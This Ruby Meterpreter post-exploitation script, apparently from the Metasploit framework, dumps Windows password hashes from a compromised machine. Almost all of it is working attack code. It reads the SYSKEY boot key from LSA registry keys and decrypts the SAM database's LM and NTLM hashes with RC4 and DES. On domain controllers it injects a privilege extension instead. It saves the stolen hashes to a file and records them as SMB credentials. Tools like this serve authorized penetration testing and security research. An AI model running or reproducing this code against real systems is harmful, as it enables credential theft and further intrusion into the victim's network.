# $Id$
# $Revision$
# Author: Carlos Perez at carlos_perez[at]darkoperator.com
#-------------------------------------------------------------------------------
################## Variable Declarations ##################

@client = client
@smb_port = 445
log_folder = nil
# Constants for SAM decryption
@sam_lmpass   = "LMPASSWORD\x00"
@sam_ntpass   = "NTPASSWORD\x00"
@sam_qwerty   = "!@\#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00"
@sam_numeric  = "0123456789012345678901234567890123456789\x00"
@sam_empty_lm = ["aad3b435b51404eeaad3b435b51404ee"].pack("H*")
@sam_empty_nt = ["31d6cfe0d16ae931b73c59d7e0c089c0"].pack("H*")

@des_odd_parity = [
	1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
	16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
	32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
	49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
	64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
	81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
	97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
	112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
	128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
	145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
	161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
	176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
	193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
	208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
	224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
	241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
]
exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu." ],
	"-l" => [ true,  "Log folder to save results, if none provided default log path will be used."]
)
meter_type = client.platform

################## Function Declarations ##################

# Usage Message Function
#-------------------------------------------------------------------------------
def usage
	print_line "Meterpreter Script for initial information gathering mainly"
	print_line "screenshot and hashdump."
	print_line(exec_opts.usage)
	raise Rex::Script::Completed
end

# Wrong Meterpreter Version Message Function
#-------------------------------------------------------------------------------
def wrong_meter_version(meter = meter_type)
	print_error("#{meter} version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end

# Log folder creation Function
#-------------------------------------------------------------------------------
def log_folder_create(log_path = nil)
	#Get hostname
	host = @client.sys.config.sysinfo["Computer"]

	# Create Filename info to be appended to downloaded files
	filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

	# Create a directory for the logs
	if log_path
		logs = ::File.join(log_path, 'initial_gather', host + filenameinfo )
	else
		logs = ::File.join(Msf::Config.log_directory, "scripts", 'initial_gather', host + filenameinfo )
	end

	# Create the log directory
	::FileUtils.mkdir_p(logs)
	return logs
end

def capture_boot_key
	bootkey = ""
	basekey = "System\\CurrentControlSet\\Control\\Lsa"
	%W{JD Skew1 GBG Data}.each do |k|
		ok = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, basekey + "\\" + k, KEY_READ)
		return nil if not ok
		bootkey << [ok.query_class.to_i(16)].pack("V")
		ok.close
	end

	keybytes    = bootkey.unpack("C*")
	descrambled = ""
	#	descrambler = [ 0x08, 0x05, 0x04, 0x02, 0x0b, 0x09, 0x0d, 0x03, 0x00, 0x06, 0x01, 0x0c, 0x0e, 0x0a, 0x0f, 0x07 ]
	descrambler = [ 0x0b, 0x06, 0x07, 0x01, 0x08, 0x0a, 0x0e, 0x00, 0x03, 0x05, 0x02, 0x0f, 0x0d, 0x09, 0x0c, 0x04 ]

	0.upto(keybytes.length-1) do |x|
		descrambled << [ keybytes[ descrambler[x] ] ].pack("C")
	end


	descrambled
end

def capture_hboot_key(bootkey)
	ok = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account", KEY_READ)
	return if not ok
	vf = ok.query_value("F")
	return if not vf
	vf = vf.data
	ok.close

	hash = Digest::MD5.new
	hash.update(vf[0x70, 16] + @sam_qwerty + bootkey + @sam_numeric)

	rc4 = OpenSSL::Cipher::Cipher.new("rc4")
	rc4.key = hash.digest
	hbootkey  = rc4.update(vf[0x80, 32])
	hbootkey << rc4.final
	return hbootkey
end

def capture_user_keys
	users = {}
	ok = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users", KEY_READ)
	return if not ok

	ok.enum_key.each do |usr|
		uk = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\#{usr}", KEY_READ)
		next if usr == 'Names'
		users[usr.to_i(16)] ||={}
		users[usr.to_i(16)][:F] = uk.query_value("F").data
		users[usr.to_i(16)][:V] = uk.query_value("V").data
		uk.close
	end
	ok.close

	ok = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\Names", KEY_READ)
	ok.enum_key.each do |usr|
		uk = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\Names\\#{usr}", KEY_READ)
		r = uk.query_value("")
		rid = r.type
		users[rid] ||= {}
		users[rid][:Name] = usr
		uk.close
	end
	ok.close
	users
end

def decrypt_user_keys(hbootkey, users)
	users.each_key do |rid|
		user = users[rid]

		hashlm_off = nil
		hashnt_off = nil
		hashlm_enc = nil
		hashnt_enc = nil

		hoff = user[:V][0x9c, 4].unpack("V")[0] + 0xcc

		# Lanman and NTLM hash available
		if(hoff + 0x28 < user[:V].length)
			hashlm_off = hoff +  4
			hashnt_off = hoff + 24
			hashlm_enc = user[:V][hashlm_off, 16]
			hashnt_enc = user[:V][hashnt_off, 16]
			# No stored lanman hash
		elsif (hoff + 0x14 < user[:V].length)
			hashnt_off = hoff + 8
			hashnt_enc = user[:V][hashnt_off, 16]
			hashlm_enc = ""
			# No stored hashes at all
		else
			hashnt_enc = hashlm_enc = ""
		end
		user[:hashlm] = decrypt_user_hash(rid, hbootkey, hashlm_enc, @sam_lmpass)
		user[:hashnt] = decrypt_user_hash(rid, hbootkey, hashnt_enc, @sam_ntpass)
	end

	users
end

def convert_des_56_to_64(kstr)
	key = []
	str = kstr.unpack("C*")

	key[0] = str[0] >> 1
	key[1] = ((str[0] & 0x01) << 6) | (str[1] >> 2)
	key[2] = ((str[1] & 0x03) << 5) | (str[2] >> 3)
	key[3] = ((str[2] & 0x07) << 4) | (str[3] >> 4)
	key[4] = ((str[3] & 0x0F) << 3) | (str[4] >> 5)
	key[5] = ((str[4] & 0x1F) << 2) | (str[5] >> 6)
	key[6] = ((str[5] & 0x3F) << 1) | (str[6] >> 7)
	key[7] = str[6] & 0x7F

	0.upto(7) do |i|
		key[i] = ( key[i] << 1)
		key[i] = @des_odd_parity[key[i]]
	end

	key.pack("C*")
end

def rid_to_key(rid)

	s1 = [rid].pack("V")
	s1 << s1[0,3]

	s2b = [rid].pack("V").unpack("C4")
	s2 = [s2b[3], s2b[0], s2b[1], s2b[2]].pack("C4")
	s2 << s2[0,3]

	[convert_des_56_to_64(s1), convert_des_56_to_64(s2)]
end

def decrypt_user_hash(rid, hbootkey, enchash, pass)

	if(enchash.empty?)
		case pass
		when @sam_lmpass
			return @sam_empty_lm
		when @sam_ntpass
			return @sam_empty_nt
		end
		return ""
	end

	des_k1, des_k2 = rid_to_key(rid)

	d1 = OpenSSL::Cipher::Cipher.new('des-ecb')
	d1.padding = 0
	d1.key = des_k1

	d2 = OpenSSL::Cipher::Cipher.new('des-ecb')
	d2.padding = 0
	d2.key = des_k2

	md5 = Digest::MD5.new
	md5.update(hbootkey[0,16] + [rid].pack("V") + pass)

	rc4 = OpenSSL::Cipher::Cipher.new('rc4')
	rc4.key = md5.digest
	okey = rc4.update(enchash)

	d1o  = d1.decrypt.update(okey[0,8])
	d1o << d1.final

	d2o  = d2.decrypt.update(okey[8,8])
	d1o << d2.final
	d1o + d2o
end

def read_hashdump
	collected_hashes = ""
	begin

		print_status("\tObtaining the boot key...")
		bootkey  = capture_boot_key

		print_status("\tCalculating the hboot key using SYSKEY #{bootkey.unpack("H*")[0]}...")
		hbootkey = capture_hboot_key(bootkey)

		print_status("\tObtaining the user list and keys...")
		users    = capture_user_keys

		print_status("\tDecrypting user keys...")
		users    = decrypt_user_keys(hbootkey, users)

		print_status("\tDumping password hashes...")

		users.keys.sort{|a,b| a<=>b}.each do |rid|
			# next if guest account or support account
			next if rid == 501 or rid == 1001
			collected_hashes << "#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::\n"
			@client.framework.db.report_auth_info(
				:host  => @client.sock.peerhost,
				:port  => @smb_port,
				:sname => 'smb',
				:user  => users[rid][:Name],
				:pass  => users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0],
				:type  => "smb_hash"
			)
		end

	rescue ::Interrupt
		raise $!
	rescue ::Rex::Post::Meterpreter::RequestError => e
		print_error("Meterpreter Exception: #{e.class} #{e}")
		print_error("This script requires the use of a SYSTEM user context (hint: migrate into service process)")
	rescue ::Exception => e
		print_error("Error: #{e.class} #{e} #{e.backtrace}")
	end
	return collected_hashes
end

def inject_hashdump
	collected_hashes = ""
	# Load priv extension
	@client.core.use("priv")
	# dump hashes
	@client.priv.sam_hashes.each do |h|
		returned_hash = h.to_s.split(":")
		rid =  returned_hash[1].to_i
		next if rid == 501 or rid == 1001
		collected_hashes << h.to_s
		@client.framework.db.report_auth_info(
			:host  => @client.sock.peerhost,
			:port  => @smb_port,
			:sname => 'smb',
			:user  => returned_hash[0],
			:pass  => returned_hash[2] +":"+ returned_hash[3],
			:type  => "smb_hash"
		)
	end
	return collected_hashes
end

# Function for checking if target is a DC
def is_dc?
	is_dc_srv = false
	serviceskey = "HKLM\\SYSTEM\\CurrentControlSet\\Services"
	if registry_enumkeys(serviceskey).include?("NTDS")
		print_good("\tThis host is a Domain Contoller!")
		is_dc_srv = true
	end
	return is_dc_srv
end

def smart_hash_dump(pwdfile)
	domain_controler = is_dc?
	if not is_uac_enabled? or is_admin?
		print_status("Dumping password hashes...")
		# Check if Running as SYSTEM
		if @client.sys.config.getuid == "NT AUTHORITY\\SYSTEM"
			# For DC's the registry read method does not work.
			if not domain_controler
				print_status "Running as SYSTEM extracting hashes from registry"
				read_hashdump.each_line do |h|
					print_good("\t#{h.chomp}")
					file_local_write(pwdfile,h.chomp)
				end
			else
				inject_hashdump.each_line do |h|
					print_good("\t#{h}")
					file_local_write(pwdfile,h)
				end
			end
		else
			if @client.sys.config.sysinfo['OS'] =~ /(Windows 7|2008|Vista)/i
				print_error("On thos version of Windows you need to be NT AUTHORITY\\SYSTEM to dump the hashes")
				print_error("Migrate in to a service process if possible.")

			else
				inject_hashdump.each_line do |h|
					print_good("\t#{h}")
					file_local_write(pwdfile,h)
				end
				
			end

		end
	else
		print_error("Insuficient privileges to dump hashes!")
	end
end



################## Main ##################
exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		usage
	when "-l"
		if ::File.directory? val
			log_folder = log_folder_create(val)
		else
			print_error("Option provided #{val} is not a folder!")
			raise Rex::Script::Completed
		end
	end
}

# Check for Version of Meterpreter
wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i

# Create Folder for logs and get path for logs
if not log_folder
	log_folder = log_folder_create
end
# Define file names
pwd_file = ::File.join(log_folder,@client.sys.config.sysinfo["Computer"]+".pwd")


# Gather info
print_status("Saving logs to #{log_folder}")

smart_hash_dump(pwd_file)